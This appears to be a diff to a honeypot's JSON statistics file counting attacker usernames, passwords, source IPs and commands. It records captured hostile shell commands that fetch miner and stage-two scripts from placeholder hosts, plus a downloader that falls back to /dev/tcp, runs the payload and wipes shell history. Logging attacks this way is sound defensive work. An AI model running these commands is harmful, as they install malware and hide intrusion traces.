@@ -1,9 +1,9 @@
 {
-  "LastUpdated": "2026-10-29T06:18:39.4690219Z",
+  "LastUpdated": "2026-10-29T06:19:03.1121959Z",
   "TotalUniqueUsernames": 783,
-  "TotalUniquePasswords": 1406,
+  "TotalUniquePasswords": 1407,
   "TotalUniqueSourceIps": 1487,
-  "TotalUniqueCommands": 190,
+  "TotalUniqueCommands": 191,
   "Usernames": {
     "root": 5047,
     "admin": 1595,
@@ -787,7 +787,7 @@
     "svanakas": 1,
     "kiko": 1,
     "anonymous": 1,
-    "deployment-probe": 2
+    "deployment-probe": 3
   },
   "Passwords": {
     "root": 154,
@@ -2195,7 +2195,8 @@
     "werdna1": 1,
     "=": 1,
     "anonymous": 1,
-    "synthetic-deployment-check-0": 2
+    "synthetic-deployment-check-0": 2,
+    "synthetic-deployment-check-final": 1
   },
   "SourceIps": {
     "109.63.128.10": 6,
@@ -2483,7 +2484,7 @@
     "116.110.22.220": 56,
     "163.7.4.169": 4,
     "35.187.231.181": 11,
-    "172.18.0.1": 18,
+    "172.18.0.1": 24,
     "118.121.203.170": 12,
     "172.18.0.3": 86,
     "187.8.120.90": 3,
@@ -3876,6 +3877,7 @@
     "chmod \u002Bx /tmp/{{TMP_FILE_1}}": 3,
     "curl -s http://{{HOST_1}}/miner.sh -o /tmp/{{TMP_FILE_1}}": 2,
     "curl -s http://{{HOST_1}}/stage2.sh -o /tmp/{{TMP_FILE_1}}": 1,
-    "curl -sSL http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/{{HOST_1}}/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: {{HOST_1}}\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 1
+    "curl -sSL http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://{{HOST_1}}/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/{{HOST_1}}/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: {{HOST_1}}\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 1,
+    "LC_ALL=C printf \u0027funnypot-kilo-production-20261029-0619\\n\u0027; uname -s": 1
   }
 }
